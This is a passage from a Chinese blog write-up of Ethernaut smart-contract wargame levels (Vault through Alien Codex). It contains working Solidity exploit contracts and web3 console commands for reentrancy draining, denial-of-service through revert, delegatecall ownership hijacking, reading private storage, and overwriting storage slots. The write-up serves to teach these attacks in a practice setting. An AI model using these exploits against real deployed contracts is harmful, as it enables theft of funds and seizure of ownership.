<p>vault 是金库的意思，合约源码把密码设置成 private 了，但这个 private
是幽默 private，因为区块链中所有存储在 storage
里的东西都是公开的，也就是说我们可以通过 <a
href="https://ethereum.stackexchange.com/questions/13910/how-to-read-a-private-variable-from-a-contract">getStorageAt</a>
来查看合约的情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">await web3.eth.getStorageAt(instance);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,1);</span><br><span class="line">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,0);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,2);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,3);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span><br><span class="line"></span><br><span class="line">await contract.unlock(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;);</span><br><span class="line"></span><br><span class="line">await contract.locked();</span><br></pre></td></tr></table></figure>
<h2 id="king">09 King</h2>
<blockquote>
<p>漏洞类型：未检查返回值</p>
</blockquote>
<p><code>((await contract.prize()).toString());</code>
可以查看这个合约的余额。</p>
<p>transfer 转账时如果遇到错误会 revert,
根据这个特性可以使得某个恶意合约成为 king, 该合约的 receive 方法始终
revert，而call和send函数则不是，而是返回一个false，因此这就是为什么需要检查call和send的返回值的原因。</p>
<p>直接写个合约，在里面fallback抛出异常即可。不过设置 revert
有个比较麻烦的点是不能给这个合约转钱了，所以只能把我的钱包地址设置白名单了。不过或许可以用之前那个
Force 的方式试试🤔之后再说吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    event Received(address sender);</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if(msg.sender != Your Wallet Address here)&#123;</span><br><span class="line">            emit Received(msg.sender); // 记录 msg.sender</span><br><span class="line">            revert(&quot;Error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimKing(address payable addr) public payable &#123;</span><br><span class="line">        (bool success, ) = addr.call&#123;value: 0.01 ether&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="re-entrancy">10 Re-entrancy</h2>
<blockquote>
<p>漏洞类型：重入攻击</p>
</blockquote>
<blockquote>
<p>take-away msg:重入的举例与防护</p>
</blockquote>
<p>重入攻击久仰大名，重入指的是攻击者在被攻击合约更新余额前重复提款的行为，我们可以在
fallback 或者 receive 函数里再次调用
withdraw，这样他就会再次向被攻击合约提出提款请求。</p>
<p>我们可以用<code>await getBalance(contract.address)</code>来查看合约的余额，这里“合约余额”与“合约定义的用户余额”不太一样，要注意一下。</p>
<p>还有就是，我最后攻击的时候用户余额已经溢出了，仍然不能提款，应该是每次提款的数目已经大于“合约余额”了，比如合约余额只剩0.004的时候我要提0.01，那就是不行的，只能以0.001为单位去提取。</p>
<p>exp 如下，不过要在前面加上 <a
href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8e0296096449d9b1cd7c5631e917330635244c37/contracts/math/SafeMath.sol">SafeMath库</a>，然后把题目源码也粘在前面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">// 粘贴 SafeMath 库</span><br><span class="line"></span><br><span class="line">// 粘贴题目源码</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Reentrance r;</span><br><span class="line">    uint256 amount = 0.001 ether;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address payable addr) public &#123;</span><br><span class="line">        r = Reentrance(addr);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(r).balance &gt;= amount) &#123;</span><br><span class="line">            r.withdraw(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        r.donate&#123;value: amount&#125;(address(this));</span><br><span class="line">        r.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toMe() external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can withdraw&quot;);</span><br><span class="line">        (bool success, ) = owner.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="elevator">11 Elevator</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:view/pure？但我没用到这两个修饰符</p>
</blockquote>
<p>这道题在本地实现好
isLastFloor，让其根据调用次数的不同返回不同值就行，第一次返回
false，第二次返回 true.</p>
<p>题目提示合约不适合保存 promises，我有点没太理解 promises
的意思...或许之后可以看看 view 和 pure 来帮助理解这一点吧。今天刷了 8
道题，得休息一下..</p>
<p>题目说：</p>
<blockquote>
<p>你可以在接口使用 view 函数修改器来防止状态被篡改. pure
修改器也可以防止状态被篡改. 认真阅读 Solidity's documentation
并学习注意事项. 完成这一关的另一个方法是构建一个 view 函数,
这个函数根据不同的输入数据返回不同的结果, 但是不更改状态, 比如
gasleft().</p>
</blockquote>
<p>抽时间可以看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;// ...</span><br><span class="line"></span><br><span class="line">contract Building &#123;</span><br><span class="line">    address public target = 0x225B6F1A5823e1dA88195BD6bA571f9D9B4C659f;</span><br><span class="line">    bool public flag = false;</span><br><span class="line">    function isLastFloor(uint) external returns (bool)&#123;</span><br><span class="line">        if(flag == false)&#123;</span><br><span class="line">            flag = true;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;goTo(uint256)&quot;,1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="privacy">12 privacy</h2>
<blockquote>
<p>漏洞类型：隐私数据上链</p>
</blockquote>
<p>跟 Vault 那题区别不大，也是计算出变量存储的 slot 然后 getStorageAt
就可以了，只不过 unlock 函数里取了 data[2] 的前十六字节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool public locked = true;   //0</span><br><span class="line">uint256 public ID = block.timestamp;   //1</span><br><span class="line">uint8 private flattening = 10;      //2</span><br><span class="line">uint8 private denomination = 255;     //2</span><br><span class="line">uint16 private awkwardness = uint16(now);     //2</span><br><span class="line">bytes32[3] private data;       // 3 4 5</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0</span>);</span><br><span class="line"><span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">1</span>);</span><br><span class="line"><span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000669db9d8&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">2</span>);</span><br><span class="line"><span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000b9d8ff0a&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">3</span>);</span><br><span class="line"><span class="string">&#x27;0x981640b3c7b393cf50dc3dc775cc956dd7293184d5d7e41799a3d83ecd976f87&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">4</span>);</span><br><span class="line"><span class="string">&#x27;0xed854f8fb8465be2b28d43a0d5e5f3e6b0679e5aa11c05848878c90d0b8c8b17&#x27;</span></span><br><span class="line"><span class="comment">// this is what we need</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">5</span>);</span><br><span class="line"><span class="string">&#x27;0x7511365c632ac62dc1071f0f24d9dc40245bfa8c01761c5462eea210a26621e8&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">6</span>);</span><br><span class="line"><span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&quot;0x7511365c632ac62dc1071f0f24d9dc40&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="gatekeeper-one">13 Gatekeeper One</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:全局变量gas；数据类型转换</p>
</blockquote>
<p>先看gate1，跟 telephone 那道题一样，写个合约调就行了。</p>
<p>gate2需要控制 gas，比较直接的方式就是爆破 call 函数里的 gas 参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (uint i = 0; i &lt; 500; i ++) &#123;</span><br><span class="line">    try gatekeeper.enter&#123;gas: 8191 * 3 + i&#125;(gateKey) returns (bool result) &#123;</span><br><span class="line">        return result;</span><br><span class="line">    &#125; catch &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gate3 有这样几条限制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 低 2byte 与 低 4byte 相等</span><br><span class="line">uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</span><br><span class="line">// 低 4byte 与 低 8byte 不等</span><br><span class="line">uint32(uint64(_gateKey)) != uint64(_gateKey)</span><br><span class="line">// 低 4byte 与 tx.origin 的低 2byte 相等</span><br><span class="line">uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))</span><br></pre></td></tr></table></figure>
<p>bytesxx 取的是高位的xx字节，uintxx
取的是低位的xx位，当小变量与大变量作比较时，会将小变量零扩展，即前面添0.
了解这些 gate3 就可以绕了。很简单，只要取自己钱包地址的低 64bit，与
0xffffffff0000ffff 相与就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function attack(address addr) external returns (bool) &#123;</span><br><span class="line">        GatekeeperOne pwner = GatekeeperOne(addr);</span><br><span class="line">        bytes8 gatekey = bytes8(uint64(uint160(tx.origin))) &amp; 0xffffffff0000ffff;</span><br><span class="line"></span><br><span class="line">        for(uint i = 0; i &lt; 500; i++) &#123;</span><br><span class="line">            try pwner.enter&#123;gas: 8192 * 3 + i&#125;(gatekey) returns (bool result) &#123;</span><br><span class="line">                return result;</span><br><span class="line">            &#125; catch &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="gatekeeper-two">14 Gatekeeper Two</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:yul</p>
</blockquote>
<p>gate1 也是要调合约</p>
<p>对于 gate2 ，caller 函数等价于返回 msg.sender，extcodesize
函数是计算该地址的合约代码长度，gate2 中要求合约代码长度为
0，而当合约的构造函数正在执行时，该合约的代码还未被完全部署到链上，因此
extcodesize 在这个时间点上返回的结果为 0。</p>
<p>所以我们选择在 Attack 函数的构造函数中执行攻击代码</p>
<p>对于gate3，我们需要让 gateKey 等于 0xffffffffffffffff ^ MitM 调用
enter 的函数签名，exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor(address addr) &#123;</span><br><span class="line">        GatekeeperTwo g = GatekeeperTwo(addr);</span><br><span class="line">        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;</span><br><span class="line">        g.enter(gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="naught-coin">15 Naught Coin</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:ERC代币</p>
</blockquote>
<p>ERC-20 标准支持将一定数量的代币授权 (approve) 给某个地址 (被授权方),
然后被授权方就能够使用 transferFrom 支配授权方的代币</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// current balance: 1000000000000000000000000</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// approve to another contract</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(<span class="string">&quot;0x148258832f9925fC21Cf5B13d5aE21EE1e6ce1F0&quot;</span>, <span class="string">&quot;1000000000000000000000000&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// invoke Attack.attack()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance again</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>
<h2 id="preservation">16 Preservation</h2>
<blockquote>
<p>漏洞类型：delegatecall修改状态变量</p>
</blockquote>
<blockquote>
<p>take-away msg:delegatecall是本地上下文执行</p>
</blockquote>
<p>我们再来重新认识一下 delegatecall：</p>
<p>假设我们有合约 A 通过 delegatecall 调用了合约 B 的函数 funcB，那么
funcB 中修改的变量其实都是合约 A 中的变量。那么可能有人要问，合约 B
是怎么知道 A 的变量的？实际上，delegatecall
是根据状态变量的定义顺序去寻找被调用合约对应的 slot 位置,
然后进行访问和修改。</p>
<p>因此，LibraryContract 中的 setTime 修改的 storedTime，其实是修改了
Preservation 合约中的
timeZone1Library，我们可以将其修改为恶意合约地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">await contract.setFirstTime(&quot;0xAC93AF93Afb73D776694684bDD39dD900EF27C9D&quot;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>但这里我有一个不太明白的点是，明明传入的参数是 32bytes 的，而
timeZone1Library 是 20bytes 的 address
变量，我不清楚是怎么数据转换以及放入 slot 当中的</p>
</blockquote>
<p>而当我们修改了 timeZone1Library 为恶意合约地址，再用 setFirstTime
调用 setTime 就调用的是恶意合约的 setTime 了，此时恶意合约直接写好同样的
setTime 签名，内部实现 owner = msg.sender 即可成功提权。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 改为恶意合约的地址</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&quot;0xAC93AF93Afb73D776694684bDD39dD900EF27C9D&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提权</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&quot;anything&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract EvilLibraryContract &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 /*_time*/) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="recovery">17 Recovery</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:链上一切信息都是公开透明的</p>
</blockquote>
<p>十七题了，还是没办法脱离题解自己想到哪里是 vulnerable
的，合约基础还没打牢...得继续努力😭</p>
<p>这道题大意为 Recovery 合约创建了 SimpleToken 合约，但是找不到
SimpleToken
这个合约的地址了，所以需要我们找到这个地址，并把这个地址里的币转移出来。</p>
<p>首先要解决的问题是：如何找到这个合约？</p>
<ul>
<li>方案一：etherscan 直接搜实例地址</li>
</ul>
<p>通过跟进“实例地址”（其实就是 Recovery
这个合约的地址）创建的新合约的地址，我们可以找到 SimpleToken 的地址</p>
<ul>
<li>方案二：<a
href="https://learnblockchain.cn/2019/06/10/address-compute/">计算</a></li>
</ul>
<p>这个方案我没仔细看...先把链接放在这儿</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> web3</span><br><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line"><span class="comment"># keccak256(address, nonce)</span></span><br><span class="line"><span class="comment"># 0xfe... 是实例地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(web3.Web3.keccak(rlp.encode([<span class="number">0xfeB38d24C57d0462741d90E44b07d976f99fBf71</span>,<span class="number">1</span>]))[<span class="number">12</span>:])))</span><br><span class="line"><span class="comment"># 0xd1d9a8e9388dbeb6f0714340e4d44b0587c6145e &lt;-这个是 SimpleToken 的地址</span></span><br></pre></td></tr></table></figure>
<p>找到合约之后，我们要解决的问题是，如何把 SimpleToken
中的合约代币转出来？</p>
<p>我们可以看到 SimpleToken 合约中存在 destruct 函数，而 <a
href="remix.ethereum.org">Remix</a>
为我们提供了与现有合约交互的功能，即部署时的 "At
Address"，这里借了张图👇</p>
<figure>
<img
src="https://img.exp10it.io/2024/04/202404221233489.png?size=medium"
alt="借的图" />
<figcaption aria-hidden="true">借的图</figcaption>
</figure>
<p>将我们钱包的地址写在 destroy 中，就可以将合约中的代币转出啦</p>
<h2 id="magicnumber">18 MagicNumber</h2>
<blockquote>
<p>漏洞类型：不算漏洞</p>
</blockquote>
<blockquote>
<p>take-away msg:EVM bytecode</p>
</blockquote>
<p>今天完全不想看原理。。先 fork 一下别人的 wp 改天再来看</p>
<p>条件: 提供一个合约地址, 该合约最多包含 10 个 opcode, 并在调用
whatIsTheMeaningOfLife 方法时返回数字 42</p>
<p>https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-iii-the-function-selector-6a9b6886ea49</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-iv-function-wrappers-d8e46672b0ed</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-v-function-bodies-2d19d4bef8be</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-vi-the-swarm-hash-70f069e22aef</p>
<figure>
<img
src="https://img.exp10it.io/2024/04/202404242022619.jpeg?size=medium"
alt="合约创建的过程" />
<figcaption aria-hidden="true">合约创建的过程</figcaption>
</figure>
<p>代码分为两部分</p>
<ul>
<li>initialization code</li>
<li>runtime code</li>
</ul>
<p>具体讲解看文章就行</p>
<p>runtime code</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x2a ; store 42 in memory</span><br><span class="line">PUSH1 0x80</span><br><span class="line">MSTORE</span><br><span class="line">PUSH1 0x20 ; return the memory address of 42</span><br><span class="line">PUSH1 0x80</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure>
<p>转成hex正好10bytes<code>602a60805260206080f3</code></p>
<p>根据上面几篇文章里介绍的原理, 编写 runtime code
的时候其实无需考虑具体的方法名是什么 (whatIsTheMeaningOfLife)</p>
<p>因为 EVM 执行字节码时永远都是从上至下执行,
而正常合约字节码的开头会根据 calldata 内 selector 的值 JUMPI
到特定的位置, 以此实现不同方法的调用 (路由)</p>
<p>对于这题来说, 只需要返回 42 就行 (RETURN), 也就无需加入针对 selector
的判断</p>
<p>initialization code</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x0a ; copy runtime code to memory</span><br><span class="line">PUSH1 0x0c</span><br><span class="line">PUSH1 0x00</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x0a ; return the memory address of code</span><br><span class="line">PUSH1 0x00</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure>
<p>转为hex<code>600a600c600039600a6000f3</code></p>
<p>最终 hex, 前 12 bytes 为 initialization code, 后 10 bytes 为 runtime
code</p>
<p><code>0x600a600c600039600a6000f3602a60805260206080f3</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// deploy contract</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: <span class="string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// 右键回显，复制object</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;blockHash&quot;</span>: <span class="string">&quot;0x63eb03c9313eb08f9634a66cf4f6dc29cf8f00447c3881e39c743e9c06af19a5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;blockNumber&quot;</span>: <span class="number">6390825</span>,</span><br><span class="line">    <span class="string">&quot;contractAddress&quot;</span>: <span class="string">&quot;0x71e6E63B138806572D11A60A8778FfA154ab96c5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cumulativeGasUsed&quot;</span>: <span class="number">1517854</span>,</span><br><span class="line">    <span class="string">&quot;effectiveGasPrice&quot;</span>: <span class="number">13186593185</span>,</span><br><span class="line">    <span class="string">&quot;from&quot;</span>: <span class="string">&quot;0x9a80a78bebe92ef9cdfc4ca116fc4925237fdbd0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gasUsed&quot;</span>: <span class="number">55354</span>,</span><br><span class="line">    <span class="string">&quot;logs&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;logsBloom&quot;</span>: <span class="string">&quot;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;to&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&quot;transactionHash&quot;</span>: <span class="string">&quot;0xa33ade6dd8c074ed59d0db434b3e7768944240707d1a4a9a61e8bb28f99d55f6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transactionIndex&quot;</span>: <span class="number">16</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;0x2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setSolver 注意这里的地址得是sendTransaction回显的合约地址</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSolver</span>(<span class="string">&quot;0x2132C7bc11De7A90B87375f282d36100a29f97a9&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="alien-codex">19 Alien Codex</h2>
<blockquote>
<p>漏洞类型：</p>
</blockquote>
<blockquote>
<p>take-away msg:数组越界访问+slot对应keccak标识符（还不是很懂）</p>
</blockquote>
<p>做这道题之前先阅读<a
href="https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018">这篇</a>，读到动态数组的存储方式</p>
<p>另外，我们可以通过以下代码来查看 codex 存放的真实 slot 地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getSlotForArrayElement(uint256 _elementIndex) public pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 startingSlotForArrayElements = keccak256(abi.encode(1));</span><br><span class="line">        return bytes32(uint256(startingSlotForArrayElements) + _elementIndex);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>此外，一个合约中存在 2^256 个 slot 槽，也就是说，slot[2^256 - 1] 就是
slot 的最后一个 32bytes 长的元素。同时，本题 revise
函数虽然在修改下标大于 length 的越界变量时会报错，但 retract
函数并没有对容量做检查，因此，我们很轻松地就可以通过 retract 函数将
codex 的 length 减为 2^256-1，进而修改通过 revise(i,'evilcontent') 将
slot 中任意一个位置修改为 'evilcontent'。</p>
<p>在本题中，我们需要将 slot[0] 中的 owner
改为我们自己钱包的地址。因此，思路如下：</p>
<ol type="1">
<li>makeContact</li>
<li>通过 retract 函数将 length 减为 2^256 - 1</li>
<li>此时使用 keccak256(abi.encodePacked(uint256(1))) 计算出存放 codex
的插槽的 slot 地址<code>array_addr</code></li>
<li>因为 array_addr 距离 slot[0] 还有 diff = (2^256 - 1) - array_addr +
1 这么多；而 codex[0] 正好是 slot[array_addr]。</li>
<li>因此，slot[0] = codex[0 + diff]，exp如下</li>
</ol>
<p>有了 slot[0] 的位置，而且我们现在也已经知道 contact 在 slot[0]
中，codex 的长度独占 slot[1]。而根据<a
href="https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there">这篇</a>文章，<a
href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/helpers/Ownable-05.sol">Ownable-05</a>
中的 owner 地址变量存放在 AlienCodex 合约变量的上方，也就是
slot[0]，从代码角度看，可以理解为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address private _owner;</span><br><span class="line">bool public contact;</span><br><span class="line">bytes32[] public codex;</span><br></pre></td></tr></table></figure>
<p>因此，我们可以将 slot[0] 修改为 0x..001&lt;address&gt;。exp
如下：</p>
<ol type="1">
<li><p>await contract.makeContact()</p></li>
<li><p>await contract.retract()</p></li>
<li><p>我们可以在本地部署以下合约，并调用getSlotForArrayElement(0)，这里本地回显的<code>0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>这个地址跟远程存储
codex 的 slot 地址一模一样</p></li>
<li><p>计算 diff = 2^256 -
0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，得到diff
=
0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a，即35707666377435648211887908874984608119992236509074197713628505308453184860938</p></li>
<li><p>await
contract.revise(diff,'0x0000000000000000000000019a80a78bebE92EF9cDfC4CA116fC4925237fDbd0')</p></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSlotForArrayElement(uint256 _elementIndex) public pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 startingSlotForArrayElements = keccak256(abi.encode(1));</span><br><span class="line">        return bytes32(uint256(startingSlotForArrayElements) + _elementIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="denial">20 Denial</h2>
<blockquote>
<p>漏洞类型：gas耗尽</p>
</blockquote>
<p>条件: 在 owner 调用 withdraw 时拒绝提取资金 (合约仍有资金, 并且交易的
gas 少于 1M)</p>
